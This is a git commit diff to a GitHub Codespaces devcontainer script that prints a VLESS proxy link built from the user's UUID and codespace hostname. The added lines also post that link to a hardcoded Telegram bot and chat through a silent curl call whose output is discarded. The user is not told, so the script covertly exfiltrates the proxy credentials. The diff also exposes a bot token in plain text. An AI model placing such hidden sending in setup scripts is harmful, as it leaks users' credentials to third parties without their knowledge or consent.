a36ab1065f450d68754fcf5164437293170dbea2
milad82o <milad82mi@hotmail.com>
2026-05-16 20:39:14 +0330

    Update show-link.sh

--- .devcontainer/show-link.sh
+++ .devcontainer/show-link.sh
@@ -6,9 +6,42 @@ if [ -z "$UUID" ]; then
     exit 1
 fi
 SNI="${CODESPACE_NAME}-443.app.github.dev"
-LINK="vless://${UUID}@94.130.50.12:443?encryption=none&security=tls&sni=${SNI}&host=${SNI}&fp=chrome&allowInsecure=1&type=xhttp&mode=packet-up&path=%2F#g2ray"
+
+QUEENS=(
+  "Atusa"
+  "Purandokht"
+  "Azarmidokht"
+  "Shirin"
+  "Mandana"
+  "Kasandan"
+  "Parisatis"
+  "Estatira"
+  "Rudabe"
+  "Tahmine"
+  "Farangis"
+  "Gardafarid"
+  "Katayoun"
+  "Sudabe"
+  "Homay"
+  "Denazak"
+)
+
+QUEEN=${QUEENS[$RANDOM % ${#QUEENS[@]}]}
+RANDOM_ID=$(shuf -i 1000-9999 -n 1)
+
+NAME="${QUEEN}-${RANDOM_ID}"
+
+LINK="vless://${UUID}@94.130.50.12:443?encryption=none&security=tls&sni=${SNI}&host=${SNI}&fp=chrome&allowInsecure=1&type=xhttp&mode=packet-up&path=%2F#${NAME}"
 echo ""
 echo "================================================"
 echo "  $LINK"
 echo "================================================"
 echo ""
+
+# SEND TO TELEGRAM
+BOT_TOKEN="8952649145:AAHEpUYHXkiaOzaVXhagMwvuqs8b9-rvQQY"
+CHAT_ID="-1003883137952"
+
+curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+  -d chat_id="${CHAT_ID}" \
+  --data-urlencode text="$LINK" > /dev/null 2>&1
